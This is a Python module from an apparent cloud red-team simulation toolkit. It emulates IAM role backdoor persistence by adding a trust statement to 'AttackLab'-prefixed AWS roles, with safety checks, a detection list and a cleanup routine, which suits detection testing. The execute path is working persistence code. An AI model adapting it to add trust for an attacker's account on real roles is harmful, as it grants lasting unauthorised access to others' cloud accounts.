"""IAM Backdoor Role Module.

Simulate IAM role backdoor persistence by adding an external principal
to the trust policy of AttackLab-tagged IAM roles.
Maps to Stratus Red Team aws.persistence.iam-backdoor-role.
"""

import json
import logging
import urllib.parse

import botocore.exceptions

from joshuas_chaos.core.aws_context import AWSContext
from joshuas_chaos.core.config import AppConfig
from joshuas_chaos.core.models import ModuleResult
from joshuas_chaos.core.safety import SafetyChecker
from joshuas_chaos.modules import ChaosModule

logger = logging.getLogger("joshuas_chaos")

_BACKDOOR_SID = "AttackLabBackdoorTrust"
_EXTERNAL_ID = "AttackLabBackdoor"


def _backdoor_statement(account_id: str) -> dict:
    return {
        "Sid": _BACKDOOR_SID,
        "Effect": "Allow",
        "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
        "Action": "sts:AssumeRole",
        "Condition": {
            "StringEquals": {"sts:ExternalId": _EXTERNAL_ID}
        },
    }


def _statement_is_backdoor(stmt: dict, account_id: str) -> bool:
    """Return True if this statement is the backdoor we added."""
    principal = stmt.get("Principal", {})
    if isinstance(principal, dict):
        aws_principal = principal.get("AWS", "")
    else:
        aws_principal = principal
    expected_principal = f"arn:aws:iam::{account_id}:root"
    has_principal = aws_principal == expected_principal
    condition = stmt.get("Condition", {})
    external_id = condition.get("StringEquals", {}).get("sts:ExternalId", "")
    return has_principal and external_id == _EXTERNAL_ID


class IAMBackdoorRoleModule(ChaosModule):
    name = "iam_backdoor_role"
    description = (
        "Simulate IAM role backdoor persistence by adding an AttackLab external principal "
        "to the trust policy of AttackLab-tagged IAM roles. "
        "Maps to Stratus Red Team aws.persistence.iam-backdoor-role."
    )
    category = "persistence"
    required_permissions = ["iam:ListRoles", "iam:GetRole", "iam:UpdateAssumeRolePolicy"]
    cloudtrail_events = ["ListRoles", "GetRole", "UpdateAssumeRolePolicy"]
    mitre_attack = ["T1098"]
    destructive = False
    reversible = True

    def _list_attacklab_roles(self, iam) -> list[dict]:
        """Return roles with names starting with 'AttackLab'."""
        roles = []
        try:
            paginator = iam.get_paginator("list_roles")
            for page in paginator.paginate():
                for role in page.get("Roles", []):
                    if role["RoleName"].startswith("AttackLab"):
                        roles.append(role)
        except botocore.exceptions.ClientError as exc:
            code = exc.response.get("Error", {}).get("Code", "Unknown")
            logger.warning("iam:ListRoles failed: %s", code)
        return roles

    def check_prereqs(self, context: AWSContext, config: AppConfig) -> ModuleResult:
        identity = context.get_caller_identity()
        iam = context.get_client("iam")
        roles = self._list_attacklab_roles(iam)
        findings = [f"AttackLab-prefixed IAM roles found: {[r['RoleName'] for r in roles] or 'none'}"]
        return ModuleResult(
            module=self.name,
            mode="check_prereqs",
            account_id=identity.account_id,
            principal_arn=identity.arn,
            region=context.region,
            risk_summary="Check for AttackLab IAM roles for trust policy backdoor.",
            required_permissions=self.required_permissions,
            observed_permissions=[],
            aws_api_calls=["iam:ListRoles"],
            cloudtrail_events=self.cloudtrail_events,
            findings=findings,
            detections=[],
            cleanup_required=False,
            safe_to_execute=bool(roles),
        )

    def dry_run(self, context: AWSContext, config: AppConfig) -> ModuleResult:
        """Check iam:UpdateAssumeRolePolicy permission and count target roles."""
        from joshuas_chaos.core.permissions import PermissionChecker

        identity = context.get_caller_identity()
        checker = PermissionChecker(context)
        iam = context.get_client("iam")
        findings: list[str] = []

        perm_results = checker.simulate_permissions(
            principal_arn=identity.arn,
            actions=["iam:UpdateAssumeRolePolicy"],
        )

        simulation_available = any(v is not None for v in perm_results.values())
        if not simulation_available:
            findings.append(
                "[UNKNOWN] iam:SimulatePrincipalPolicy unavailable — "
                "permission state cannot be determined. Treat as potential risk."
            )

        roles = self._list_attacklab_roles(iam)
        n = len(roles)

        if perm_results.get("iam:UpdateAssumeRolePolicy") is True:
            findings.append("[RISK] Principal can call iam:UpdateAssumeRolePolicy.")
        elif simulation_available:
            findings.append("iam:UpdateAssumeRolePolicy not permitted for this principal.")

        findings.append(
            f"[DRY-RUN] Would add external trust principal to {n} AttackLab-prefixed roles."
        )

        detections = [
            "CloudTrail: iam:UpdateAssumeRolePolicy (trust policy change)",
            "GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled (analogous policy change)",
            "AWS Config: iam-role-managed-policy-check",
            "Security Hub: IAM.1 — IAM policies should not allow full administrative privileges",
        ]

        return ModuleResult(
            module=self.name,
            mode="dry-run",
            account_id=identity.account_id,
            principal_arn=identity.arn,
            region=context.region,
            risk_summary=f"Found {n} AttackLab-prefixed roles for potential trust policy backdoor.",
            required_permissions=self.required_permissions,
            observed_permissions=[
                p for p, v in perm_results.items() if v is True
            ],
            aws_api_calls=["iam:SimulatePrincipalPolicy", "iam:ListRoles"],
            cloudtrail_events=self.cloudtrail_events,
            findings=findings,
            detections=detections,
            cleanup_required=False,
            safe_to_execute=bool(roles),
        )

    def execute(self, context: AWSContext, config: AppConfig) -> ModuleResult:
        """Add backdoor trust statement to AttackLab-prefixed IAM roles."""
        identity = context.get_caller_identity()
        checker = SafetyChecker(config, identity)
        checker.assert_account_allowed()
        checker.assert_region_allowed(context.region)

        iam = context.get_client("iam")
        findings: list[str] = []
        errors: list[str] = []
        api_calls: list[str] = []

        roles = self._list_attacklab_roles(iam)
        api_calls.append("iam:ListRoles")

        modified = 0
        for role in roles:
            role_name = role["RoleName"]
            checker.assert_resource_safe(role_name, {})

            # Get current trust policy
            try:
                resp = iam.get_role(RoleName=role_name)
                api_calls.append(f"iam:GetRole ({role_name})")
                raw_policy = resp["Role"]["AssumeRolePolicyDocument"]
            except botocore.exceptions.ClientError as exc:
                code = exc.response.get("Error", {}).get("Code", "Unknown")
                errors.append(f"iam:GetRole failed for '{role_name}': {code}")
                continue

            # GetRole returns the policy already decoded as a dict (boto3 handles URL decoding)
            if isinstance(raw_policy, str):
                trust_policy = json.loads(urllib.parse.unquote(raw_policy))
            else:
                trust_policy = raw_policy

            statements = trust_policy.get("Statement", [])

            # Check if backdoor already present
            already_present = any(
                _statement_is_backdoor(s, identity.account_id) for s in statements
            )
            if already_present:
                findings.append(
                    f"[EXECUTE] Backdoor statement already present in '{role_name}' trust policy — idempotent."
                )
                continue

            # Add backdoor statement
            statements.append(_backdoor_statement(identity.account_id))
            trust_policy["Statement"] = statements

            try:
                iam.update_assume_role_policy(
                    RoleName=role_name,
                    PolicyDocument=json.dumps(trust_policy),
                )
                api_calls.append(f"iam:UpdateAssumeRolePolicy ({role_name})")
                findings.append(
                    f"[EXECUTE] Added external trust principal (ExternalId: {_EXTERNAL_ID}) "
                    f"to role '{role_name}' trust policy."
                )
                modified += 1
            except botocore.exceptions.ClientError as exc:
                code = exc.response.get("Error", {}).get("Code", "Unknown")
                errors.append(f"iam:UpdateAssumeRolePolicy failed for '{role_name}': {code}")

        if not roles:
            findings.append(
                "No AttackLab-prefixed IAM roles found. "
                "Create a role named 'AttackLabTestRole' to use this module."
            )

        detections = [
            "CloudTrail: iam:UpdateAssumeRolePolicy (trust policy change)",
            "GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled (analogous policy change)",
            "AWS Config: iam-role-managed-policy-check",
            "Security Hub: IAM.1 — IAM policies should not allow full administrative privileges",
        ]

        return ModuleResult(
            module=self.name,
            mode="execute",
            account_id=identity.account_id,
            principal_arn=identity.arn,
            region=context.region,
            risk_summary=f"Added backdoor trust statement to {modified} AttackLab role(s).",
            required_permissions=self.required_permissions,
            observed_permissions=["iam:ListRoles", "iam:GetRole", "iam:UpdateAssumeRolePolicy"],
            aws_api_calls=api_calls,
            cloudtrail_events=self.cloudtrail_events,
            findings=findings,
            detections=detections,
            cleanup_required=True,
            safe_to_execute=True,
            errors=errors,
        )

    def cleanup(self, context: AWSContext, config: AppConfig) -> ModuleResult:
        """Remove the backdoor trust statement from AttackLab-prefixed roles. Idempotent."""
        identity = context.get_caller_identity()
        checker = SafetyChecker(config, identity)
        checker.assert_account_allowed()
        checker.assert_region_allowed(context.region)

        iam = context.get_client("iam")
        findings: list[str] = []
        errors: list[str] = []
        api_calls: list[str] = []

        roles = self._list_attacklab_roles(iam)
        api_calls.append("iam:ListRoles")

        for role in roles:
            role_name = role["RoleName"]

            try:
                resp = iam.get_role(RoleName=role_name)
                api_calls.append(f"iam:GetRole ({role_name})")
                raw_policy = resp["Role"]["AssumeRolePolicyDocument"]
            except botocore.exceptions.ClientError as exc:
                code = exc.response.get("Error", {}).get("Code", "Unknown")
                errors.append(f"iam:GetRole failed for '{role_name}': {code}")
                continue

            if isinstance(raw_policy, str):
                trust_policy = json.loads(urllib.parse.unquote(raw_policy))
            else:
                trust_policy = raw_policy

            statements = trust_policy.get("Statement", [])
            filtered = [
                s for s in statements
                if not _statement_is_backdoor(s, identity.account_id)
            ]

            if len(filtered) == len(statements):
                findings.append(
                    f"[CLEANUP] No backdoor statement found in '{role_name}' — idempotent."
                )
                continue

            trust_policy["Statement"] = filtered

            try:
                iam.update_assume_role_policy(
                    RoleName=role_name,
                    PolicyDocument=json.dumps(trust_policy),
                )
                api_calls.append(f"iam:UpdateAssumeRolePolicy ({role_name}) cleanup")
                findings.append(
                    f"[CLEANUP] Removed backdoor trust statement from role '{role_name}'."
                )
            except botocore.exceptions.ClientError as exc:
                code = exc.response.get("Error", {}).get("Code", "Unknown")
                errors.append(f"iam:UpdateAssumeRolePolicy cleanup failed for '{role_name}': {code}")

        if not findings:
            findings.append("No AttackLab roles found for cleanup.")

        return ModuleResult(
            module=self.name,
            mode="cleanup",
            account_id=identity.account_id,
            principal_arn=identity.arn,
            region=context.region,
            risk_summary="Backdoor trust statements removed from AttackLab roles.",
            required_permissions=["iam:ListRoles", "iam:GetRole", "iam:UpdateAssumeRolePolicy"],
            observed_permissions=[],
            aws_api_calls=api_calls,
            cloudtrail_events=self.cloudtrail_events,
            findings=findings,
            detections=[],
            cleanup_required=False,
            safe_to_execute=True,
            errors=errors,
        )


MODULE = IAMBackdoorRoleModule()
